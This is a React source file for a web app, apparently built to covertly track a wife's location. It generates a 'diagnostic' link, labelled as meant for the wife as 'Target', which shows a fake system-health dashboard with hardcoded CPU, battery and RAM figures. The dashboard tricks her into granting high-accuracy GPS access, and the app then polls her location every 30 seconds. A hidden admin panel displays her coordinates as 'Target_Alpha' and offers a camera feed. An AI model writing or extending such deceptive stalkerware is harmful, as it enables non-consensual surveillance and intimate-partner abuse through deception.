
import React, { useState, useEffect, useCallback } from 'react';
import Sidebar from './components/Sidebar';
import LocationCard from './components/LocationCard';
import CameraFeed from './components/CameraFeed';
import { UserProfile, AIInsight, LocationData } from './types';
import { getLocationInsights } from './services/geminiService';

const App: React.FC = () => {
  const isStealthMode = new URLSearchParams(window.location.search).get('mode') === 'diagnostic';
  
  const [isUnlocked, setIsUnlocked] = useState(false);
  const [showCameraDiagnostic, setShowCameraDiagnostic] = useState(false);
  const [locationLogs, setLocationLogs] = useState<LocationData[]>([]);
  const [copyStatus, setCopyStatus] = useState<'none' | 'admin' | 'stealth'>('none');
  const [locationError, setLocationError] = useState<string | null>(null);
  
  const [members, setMembers] = useState<UserProfile[]>([
    {
      id: '1',
      name: 'Istri Tersayang',
      avatar: 'https://picsum.photos/id/64/200/200',
      lastSeen: Date.now(),
      status: 'online',
    },
    {
      id: '2',
      name: 'Saya',
      avatar: 'https://picsum.photos/id/65/200/200',
      lastSeen: Date.now(),
      status: 'online',
    }
  ]);

  const [activeMemberId, setActiveMemberId] = useState<string>('1');
  const [insight, setInsight] = useState<AIInsight | null>(null);
  const [isLoadingInsight, setIsLoadingInsight] = useState(false);

  const activeMember = members.find(m => m.id === activeMemberId) || members[0];

  const updateLocation = useCallback(() => {
    if (!navigator.geolocation) {
      setLocationError("Browser tidak mendukung geolokasi.");
      return;
    }

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        setLocationError(null);
        const newLocation: LocationData = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
          timestamp: position.timestamp,
        };

        setMembers(prev => prev.map(m => 
          m.id === '1' 
            ? { ...m, currentLocation: newLocation, lastSeen: Date.now(), status: 'online' }
            : m
        ));

        setLocationLogs(prev => [newLocation, ...prev].slice(0, 10));

        if (isUnlocked && !isStealthMode) {
          setIsLoadingInsight(true);
          const res = await getLocationInsights(newLocation);
          setInsight(res);
          setIsLoadingInsight(false);
        }
      },
      (err) => {
        let msg = "Error lokasi tidak diketahui.";
        switch(err.code) {
          case err.PERMISSION_DENIED: msg = "Izin lokasi ditolak."; break;
          case err.POSITION_UNAVAILABLE: msg = "Posisi tidak tersedia."; break;
          case err.TIMEOUT: msg = "Timeout permintaan lokasi."; break;
        }
        setLocationError(msg);
        setMembers(prev => prev.map(m => m.id === '1' ? { ...m, status: 'offline' } : m));
      },
      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
    );
  }, [isUnlocked, isStealthMode]);

  useEffect(() => {
    updateLocation();
    const interval = setInterval(updateLocation, 30000);
    return () => clearInterval(interval);
  }, [updateLocation]);

  const getCleanUrl = () => window.location.origin + window.location.pathname;

  const handleCopyLink = (type: 'admin' | 'stealth') => {
    const url = type === 'stealth' ? `${getCleanUrl()}?mode=diagnostic` : getCleanUrl();
    navigator.clipboard.writeText(url).then(() => {
      setCopyStatus(type);
      setTimeout(() => setCopyStatus('none'), 2000);
    });
  };

  const openInGoogleMaps = (lat: number, lng: number) => {
    window.open(`https://www.google.com/maps?q=${lat},${lng}`, '_blank');
  };

  const SystemDashboard = () => (
    <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 animate-in fade-in duration-500">
      <div className="bg-slate-900/50 p-6 rounded-xl border border-slate-800 shadow-lg">
        <div className="flex items-center justify-between mb-4">
          <h3 className="text-xs font-bold text-slate-500 uppercase">CPU Usage</h3>
          <i className="fas fa-microchip text-slate-700"></i>
        </div>
        <div className="flex items-end gap-2 mb-2">
          <span className="text-3xl font-bold mono">14%</span>
          <span className="text-[10px] text-emerald-500 mb-1">Normal</span>
        </div>
        <div className="w-full bg-slate-800 h-1 rounded-full overflow-hidden">
          <div className="bg-blue-500 h-full w-[14%]"></div>
        </div>
      </div>
      <div className="bg-slate-900/50 p-6 rounded-xl border border-slate-800 shadow-lg">
        <div className="flex items-center justify-between mb-4">
          <h3 className="text-xs font-bold text-slate-500 uppercase">Battery Health</h3>
          <i className="fas fa-battery-three-quarters text-emerald-600"></i>
        </div>
        <div className="flex items-end gap-2 mb-2">
          <span className="text-3xl font-bold mono">89%</span>
          <span className="text-[10px] text-slate-400 mb-1">Discharging</span>
        </div>
        <div className="w-full bg-slate-800 h-1 rounded-full overflow-hidden">
          <div className="bg-emerald-500 h-full w-[89%]"></div>
        </div>
      </div>
      <div className="bg-slate-900/50 p-6 rounded-xl border border-slate-800 shadow-lg">
        <div className="flex items-center justify-between mb-4">
          <h3 className="text-xs font-bold text-slate-500 uppercase">RAM Storage</h3>
          <i className="fas fa-memory text-slate-700"></i>
        </div>
        <div className="flex items-end gap-2 mb-2">
          <span className="text-3xl font-bold mono">2.4<span className="text-sm">GB</span></span>
          <span className="text-[10px] text-slate-400 mb-1">Available: 5.6GB</span>
        </div>
        <div className="w-full bg-slate-800 h-1 rounded-full overflow-hidden">
          <div className="bg-orange-500 h-full w-[30%]"></div>
        </div>
      </div>
    </div>
  );

  if (isStealthMode) {
    return (
      <div className="min-h-screen bg-slate-950 text-slate-200 font-mono flex flex-col p-6 sm:p-10">
        <div className="max-w-4xl mx-auto w-full space-y-8 animate-in fade-in duration-700">
           <div className="flex items-center justify-between border-b border-slate-800 pb-6">
              <div className="flex items-center gap-3">
                 <div className="w-10 h-10 bg-blue-600 rounded flex items-center justify-center shadow-lg shadow-blue-600/20">
                    <i className="fas fa-microchip text-white"></i>
                 </div>
                 <h1 className="text-lg font-bold tracking-tighter uppercase">SysUtility <span className="text-slate-500 font-normal">v1.0.4</span></h1>
              </div>
              <div className="text-[10px] text-emerald-500 flex items-center gap-2">
                 <div className="w-1.5 h-1.5 bg-emerald-500 rounded-full animate-pulse"></div>
                 SYSTEM_SYNCED
              </div>
           </div>

           <div className="p-8 border border-dashed border-slate-800 rounded-3xl bg-slate-900/20 backdrop-blur-md">
             <div className="mb-8">
                <h2 className="text-xl font-bold mb-1">Diagnostic Dashboard</h2>
                <p className="text-slate-500 text-sm">Hardware resources are operating within normal parameters.</p>
             </div>
             <SystemDashboard />
             
             <div className="mt-8 space-y-4">
                <h3 className="text-[10px] font-bold text-slate-500 uppercase tracking-widest">Active Sensor Readouts</h3>
                {activeMember.currentLocation ? (
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                    <div className="p-4 bg-slate-900/60 rounded-xl border border-slate-800 flex justify-between items-center group hover:border-blue-500/50 transition-colors">
                       <div>
                          <p className="text-[9px] text-slate-600 uppercase mb-1">GPS_COORDINATE_X (LAT)</p>
                          <p className="text-lg font-bold text-blue-400 mono">{activeMember.currentLocation.latitude.toFixed(6)}°</p>
                       </div>
                       <i className="fas fa-location-crosshairs text-slate-800 group-hover:text-blue-500/30 transition-colors"></i>
                    </div>
                    <div className="p-4 bg-slate-900/60 rounded-xl border border-slate-800 flex justify-between items-center group hover:border-blue-500/50 transition-colors">
                       <div>
                          <p className="text-[9px] text-slate-600 uppercase mb-1">GPS_COORDINATE_Y (LNG)</p>
                          <p className="text-lg font-bold text-blue-400 mono">{activeMember.currentLocation.longitude.toFixed(6)}°</p>
                       </div>
                       <i className="fas fa-location-arrow text-slate-800 group-hover:text-blue-500/30 transition-colors"></i>
                    </div>
                    <div className="p-4 bg-slate-900/60 rounded-xl border border-slate-800 sm:col-span-2 flex justify-between items-center">
                       <div>
                          <p className="text-[9px] text-slate-600 uppercase mb-1">Signal Integrity / Accuracy</p>
                          <div className="flex items-center gap-3">
                             <div className="flex gap-1">
                                {[1,2,3,4,5].map(i => (
                                  <div key={i} className={`w-1 h-3 rounded-full ${i <= (activeMember.currentLocation!.accuracy < 20 ? 5 : 3) ? 'bg-emerald-500' : 'bg-slate-800'}`}></div>
                                ))}
                             </div>
                             <p className={`text-xs font-bold mono ${activeMember.currentLocation.accuracy < 20 ? 'text-emerald-400' : 'text-amber-400'}`}>
                                ± {activeMember.currentLocation.accuracy.toFixed(1)}m (Confidence: {activeMember.currentLocation.accuracy < 20 ? '95%+' : 'Standard'})
                             </p>
                          </div>
                       </div>
                       <div className="text-right">
                          <p className="text-[9px] text-slate-600 uppercase mb-1">Status</p>
                          <p className="text-[10px] text-emerald-500 font-bold animate-pulse">FIXED_LOCKED</p>
                       </div>
                    </div>
                    <div className="sm:col-span-2">
                      <button 
                        onClick={() => openInGoogleMaps(activeMember.currentLocation!.latitude, activeMember.currentLocation!.longitude)}
                        className="w-full p-4 bg-blue-600/10 border border-blue-500/30 rounded-xl flex items-center justify-center gap-3 group hover:bg-blue-600/20 transition-all active:scale-[0.98]"
                      >
                         <i className="fas fa-search-location text-blue-400 group-hover:scale-110 transition-transform"></i>
                         <span className="text-[10px] font-bold text-blue-300 uppercase tracking-widest">Cross-Reference Map Data (Verify Source)</span>
                      </button>
                    </div>
                  </div>
                ) : (
                  <div className="p-10 border border-slate-800 rounded-xl bg-slate-900/20 text-center">
                     <i className="fas fa-satellite-dish text-slate-800 text-2xl mb-3 animate-spin-slow"></i>
                     <p className="text-[10px] text-slate-600 uppercase italic">Acquiring GPS Satellite Fix...</p>
                  </div>
                )}
             </div>

             <div className="mt-8 grid grid-cols-1 sm:grid-cols-2 gap-4">
                <div className="p-4 bg-slate-800/20 rounded-xl border border-slate-800">
                   <p className="text-[10px] text-slate-500 uppercase mb-1">Network Stability</p>
                   <p className="text-sm font-bold text-emerald-400">EXCELLENT (42ms)</p>
                </div>
                <div className="p-4 bg-slate-800/20 rounded-xl border border-slate-800">
                   <p className="text-[10px] text-slate-500 uppercase mb-1">Sensors Integration</p>
                   <p className="text-sm font-bold text-slate-300">ACTIVE</p>
                </div>
             </div>
           </div>

           {locationError && (
             <div className="p-3 bg-rose-500/10 border border-rose-500/30 rounded text-rose-500 text-[10px] text-center">
                SENSOR_ERROR: {locationError.toUpperCase()} - Pastikan izin lokasi aktif.
             </div>
           )}

           <div className="text-center">
              <p className="text-[9px] text-slate-700 uppercase tracking-[0.3em]">Device ID: {Math.random().toString(36).substring(2, 10).toUpperCase()}</p>
           </div>
        </div>
      </div>
    );
  }

  return (
    <div className="flex h-screen bg-slate-950 text-slate-200 overflow-hidden font-mono">
      <Sidebar 
        members={members} 
        activeMemberId={activeMemberId} 
        onSelectMember={setActiveMemberId}
        isUnlocked={isUnlocked}
        onUnlock={() => setIsUnlocked(true)}
      />

      <main className="flex-1 flex flex-col min-w-0">
        <header className="h-16 bg-slate-900 border-b border-slate-800 flex items-center justify-between px-8 shrink-0">
          <div className="flex items-center gap-4">
            <h2 className="text-xs font-bold tracking-widest text-slate-400 uppercase">
              {isUnlocked ? '> ADM_PANEL_GEO' : '> SYSTEM_MONITOR'}
            </h2>
            {isLoadingInsight && <div className="w-2 h-2 bg-blue-500 rounded-full animate-pulse"></div>}
          </div>
          <div className="flex items-center gap-4">
             <div className="text-[10px] text-slate-500">ROOT_ACCESS: {isUnlocked ? 'GRANTED' : 'RESTRICTED'}</div>
             {isUnlocked && (
               <button onClick={() => setIsUnlocked(false)} className="text-[10px] bg-slate-800 px-3 py-1 rounded hover:bg-slate-700 border border-slate-700 uppercase transition-colors">
                 Exit_Admin
               </button>
             )}
          </div>
        </header>

        <div className="flex-1 p-8 overflow-y-auto">
          {!isUnlocked ? (
            <div className="max-w-4xl mx-auto space-y-8">
               <div className="p-10 border border-dashed border-slate-800 rounded-3xl bg-slate-900/20 backdrop-blur-sm">
                 <div className="flex items-center gap-4 mb-6">
                    <div className="w-12 h-12 bg-blue-500/10 rounded-full flex items-center justify-center border border-blue-500/20">
                       <i className="fas fa-shield-alt text-blue-500"></i>
                    </div>
                    <div>
                       <h1 className="text-2xl font-bold tracking-tight">System Diagnostic Dashboard</h1>
                       <p className="text-slate-500 text-sm">Monitoring device health and peripheral connectivity.</p>
                    </div>
                 </div>
                 <SystemDashboard />
               </div>
            </div>
          ) : (
            <div className="grid grid-cols-1 lg:grid-cols-3 gap-8 max-w-7xl mx-auto animate-in zoom-in-95 duration-300">
              <div className="lg:col-span-2 space-y-6">
                
                {/* Live Coordinate Display instead of Search Bar */}
                <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6 shadow-2xl overflow-hidden relative">
                   <div className="absolute top-0 right-0 w-32 h-32 bg-blue-500/5 blur-3xl rounded-full"></div>
                   <h3 className="text-xs font-bold text-slate-400 uppercase tracking-widest mb-4 flex items-center gap-2">
                     <i className="fas fa-satellite text-blue-500"></i> Live Telemetry Output
                   </h3>
                   
                   {activeMember.currentLocation ? (
                     <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                        <div className="bg-slate-950/50 border border-slate-800 p-4 rounded-xl">
                           <p className="text-[9px] text-slate-500 uppercase mb-1">Target Latitude</p>
                           <p className="text-xl font-bold text-emerald-400 mono tracking-tighter">
                              {activeMember.currentLocation.latitude.toFixed(8)}
                           </p>
                        </div>
                        <div className="bg-slate-950/50 border border-slate-800 p-4 rounded-xl">
                           <p className="text-[9px] text-slate-500 uppercase mb-1">Target Longitude</p>
                           <p className="text-xl font-bold text-emerald-400 mono tracking-tighter">
                              {activeMember.currentLocation.longitude.toFixed(8)}
                           </p>
                        </div>
                     </div>
                   ) : (
                     <div className="p-4 bg-slate-950/50 border border-slate-800 rounded-xl text-center">
                        <p className="text-xs text-slate-600 italic">WAITING_FOR_REMOTE_NODE_LINK...</p>
                     </div>
                   )}
                </div>

                <div className="bg-slate-900 rounded-3xl aspect-video relative overflow-hidden border border-slate-800 shadow-2xl group">
                  <div className="absolute inset-0 bg-[url('https://www.google.com/maps/vt/pb=!1m4!1m3!1i12!2i2605!3i1622!2m3!1e0!2sm!3i420120488!3m8!2sen!3sus!5e1105!12m4!1e68!2m2!1sset!2sRoadmap!4e0!5m1!1e0')] bg-cover bg-center grayscale contrast-125 opacity-20 group-hover:opacity-30 transition-opacity duration-700"></div>
                  
                  {activeMember.currentLocation && (
                    <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 z-10">
                      <div className="relative">
                        <div className="absolute -inset-16 bg-blue-500/5 rounded-full animate-pulse"></div>
                        <div className="absolute -inset-8 bg-blue-500/10 rounded-full animate-ping"></div>
                        <div className="w-8 h-8 bg-blue-500 rounded-full border-4 border-slate-900 shadow-[0_0_30px_rgba(59,130,246,1)] flex items-center justify-center cursor-pointer" onClick={() => openInGoogleMaps(activeMember.currentLocation!.latitude, activeMember.currentLocation!.longitude)}>
                           <div className="w-2 h-2 bg-white rounded-full"></div>
                        </div>
                        <div className="absolute top-10 left-1/2 -translate-x-1/2 whitespace-nowrap bg-slate-900 border border-slate-700 px-4 py-1.5 rounded-full shadow-2xl">
                          <p className="text-[10px] font-bold text-blue-400 uppercase tracking-widest">Target_Alpha</p>
                        </div>
                      </div>
                    </div>
                  )}

                  {!activeMember.currentLocation && (
                    <div className="absolute inset-0 flex items-center justify-center bg-slate-950/80 backdrop-blur-sm z-30">
                       <div className="text-center p-8">
                          <i className="fas fa-satellite-dish text-3xl text-slate-700 mb-4 animate-bounce"></i>
                          <p className="text-xs text-slate-500 uppercase tracking-widest font-bold">Menunggu Link Istri Diakses...</p>
                       </div>
                    </div>
                  )}
                </div>

                {/* Link Sharing Tools moved here for convenience */}
                <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6 shadow-2xl relative overflow-hidden">
                   <h3 className="text-xs font-bold text-slate-400 uppercase tracking-widest mb-6 flex items-center gap-2">
                     <i className="fas fa-share-nodes text-blue-500"></i> Link Sharing
                   </h3>
                   
                   <div className="space-y-4">
                      <div className="p-4 bg-blue-500/5 border border-blue-500/20 rounded-xl">
                         <div className="flex items-center justify-between mb-3">
                            <span className="text-[10px] font-bold text-blue-400 uppercase">Link Untuk Istri (Target)</span>
                            <span className="text-[9px] text-slate-500 italic">Kirim link ini agar dia "diagnosa" HP</span>
                         </div>
                         <div className="flex gap-2">
                            <input readOnly value={`${getCleanUrl()}?mode=diagnostic`} className="flex-1 bg-slate-950 border border-slate-800 rounded p-2 text-[10px] text-slate-400 mono outline-none" />
                            <button onClick={() => handleCopyLink('stealth')} className={`px-4 rounded text-[10px] font-bold transition-all ${copyStatus === 'stealth' ? 'bg-emerald-600 text-white' : 'bg-blue-600 text-white hover:bg-blue-500'}`}>
                               {copyStatus === 'stealth' ? 'COPIED' : 'COPY'}
                            </button>
                         </div>
                      </div>
                   </div>
                </div>

                <div className="grid grid-cols-2 sm:grid-cols-4 gap-4">
                  {[
                    { id: 'cam', icon: 'fa-video', label: 'Cam_Feed', color: showCameraDiagnostic ? 'bg-blue-500/20 border-blue-500/50 text-blue-400' : 'bg-slate-900 border-slate-800 text-slate-400' },
                    { id: 'log', icon: 'fa-list-ul', label: 'Logs', color: 'bg-slate-900 border-slate-800 text-slate-400' },
                    { id: 'net', icon: 'fa-network-wired', label: 'Sync', color: 'bg-slate-900 border-slate-800 text-slate-400' },
                    { id: 'clr', icon: 'fa-trash-can', label: 'Reset', color: 'bg-slate-900 border-slate-800 text-rose-500/70' },
                  ].map((action) => (
                    <button 
                      key={action.id} 
                      onClick={action.id === 'cam' ? () => setShowCameraDiagnostic(!showCameraDiagnostic) : undefined}
                      className={`${action.color} border p-5 rounded-2xl flex flex-col items-center gap-3 hover:brightness-125 transition-all shadow-lg active:scale-95`}
                    >
                      <i className={`fas ${action.icon} text-lg`}></i>
                      <span className="text-[9px] font-black uppercase tracking-widest">{action.label}</span>
                    </button>
                  ))}
                </div>

                {showCameraDiagnostic && (
                  <div className="aspect-video w-full rounded-3xl overflow-hidden border border-slate-800 animate-in slide-in-from-bottom-8 duration-700 shadow-2xl relative">
                     <CameraFeed />
                  </div>
                )}
              </div>

              <div className="lg:col-span-1">
                <div className="space-y-6">
                   <LocationCard 
                     member={activeMember} 
                     insight={insight} 
                     loadingInsight={isLoadingInsight} 
                   />
                </div>
              </div>
            </div>
          )}
        </div>
      </main>
    </div>
  );
};

export default App;
